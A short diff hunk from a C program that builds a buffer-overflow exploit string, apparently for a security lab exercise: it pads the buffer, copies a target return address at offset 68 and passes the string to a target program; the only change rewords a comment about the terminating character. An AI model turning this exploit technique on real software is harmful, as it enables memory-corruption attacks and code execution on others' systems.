@@ -37,7 +37,7 @@ main ( int argc, char * argv[] )
 	// "AAAA" + 64 characters allocated with "buf" = 68
 	strcpy(&sploit_str[68], target_addr);
 
-	// Remove EOF character
+	// Append EOF character
 	sploit_str[72] = 0;
 
 	args[0] = TARGET;
